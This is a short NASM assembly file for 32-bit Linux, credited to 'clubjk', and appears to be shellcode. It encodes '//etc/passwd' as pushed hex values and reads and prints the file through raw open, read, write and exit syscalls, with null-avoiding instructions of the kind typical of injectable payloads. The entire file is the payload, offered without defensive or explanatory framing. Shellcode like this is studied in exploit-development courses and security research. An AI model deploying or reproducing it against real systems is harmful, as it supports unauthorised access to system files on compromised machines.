;.nasm
;Author:clubjk



global _start

section .text

_start:
	
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	;xor ecx, ecx
	;mul ecx

open:
	mov al, 0x05
	push ecx
	push 0x64777373
	push 0x61702f63
	push 0x74652f2f
	mov ebx, esp
	int 0x80

read:
	xchg eax, ebx
	xchg eax, ecx
	mov al, 0x03
	mov dx, 0x0FFF
	inc edx
	int 0x80

write:
	xchg eax, edx
	mov bl, 0x01
	shr eax, 0x0a
	int 0x80

exit:
	xchg eax, ebx
	int 0x80


